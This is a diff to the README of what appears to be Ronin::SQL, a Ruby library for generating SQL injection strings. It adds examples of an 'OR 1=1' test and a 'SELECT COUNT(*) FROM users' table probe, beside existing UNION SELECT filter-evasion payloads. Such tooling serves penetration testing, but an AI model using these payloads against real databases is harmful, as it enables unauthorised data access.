@@ -43,7 +43,14 @@ Hex decode a String:
 
 ### SQLi DSL
 
-Injecting a `1=1` test into a String value:
+Injecting a `1=1` test into a Integer comparison:
+
+    sqli = Ronin::SQL::Injection.new
+    sqli.or { 1 == 1 }
+    puts sqli
+    # 1' OR '1'='1
+
+Injecting a `1=1` test into a String comparison:
 
     sqli = Ronin::SQL::Injection.new(:escape => :string)
     sqli.or { string(1) == string(1) }
@@ -77,6 +84,13 @@ Filter evasion:
     sqli.union { select(1,2,3,4,id).from(users) }
     puts sqli.to_sql(:space => '/**/')
     # 1/**/UNION/**/SELECT/**/(1,2,3,4,id)/**/FROM/**/users
+
+Test if a table exists:
+
+    sqli = Ronin::SQL::Injection.new
+    sqli.and { select(count).from(:users) == 1 }
+    puts sqli.to_sql
+    # 1 AND (SELECT COUNT(*) FROM users)=1
 
 ## Requirements
 
